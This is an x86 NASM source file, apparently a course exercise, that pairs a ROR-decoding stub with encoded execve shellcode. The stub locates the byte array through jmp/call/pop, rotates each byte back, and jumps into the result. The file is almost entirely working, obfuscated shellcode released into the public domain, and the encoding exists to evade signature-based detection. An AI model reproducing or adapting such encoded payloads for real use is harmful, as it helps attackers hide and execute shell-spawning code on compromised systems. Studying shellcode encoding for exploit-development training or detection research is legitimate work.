; Filename: ror-decoder.nasm
; Author:   John Pierce, May 1, 2013 remsanattexascarverdotcom
;
; Purpose: Decode bytecode encoded with ror_encoder and execute
;
; bytecode below will decode and execute execve from the stack
; Original execve shellcode was
; written by Vivek Ramachandran of Securitytube as part of
; his course in Linux assembly language programming.
; Info: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

;
; Must be run as shellcode test environment.  Not a standalone program
;

; This program was written by John W. Pierce, CISSP.  I enter it into
; the public domain.  You are free to use and/or redistribute it without 
; restriction, though attribution would be the right thing to do.  I hope
; it is of some value, but I make ABSOLUTELY NO WARRANTY OF ANY KIND.
;
global _start			

section .text
_start:

	jmp short call_decoder  ; using jmp/call/pop method to get address
				; of shellcode

decoder:
	pop esi			; address of shellcode is in esi now

decode:
	rol byte [esi], 0x3	; ROR factor from encoding, ROL to decode
	cmp byte[esi], 0xaa	; marked end of code with a 0xaa byte
	jz Shellcode		; if all code decoded, jump to it
	inc esi			; else, process the next byte
	jmp short decode	

call_decoder:

	call decoder
	Shellcode: db 0x26,0x18,0x0a,0x0d,0xe5,0xe5,0x6e,0x0d,0x0d,0xe5,0x4c,0x2d,0xcd,0x31,0x7c,0x0a,0x31,0x5c,0x6a,0x31,0x3c,0x16,0x61,0xb9,0x10,0x55
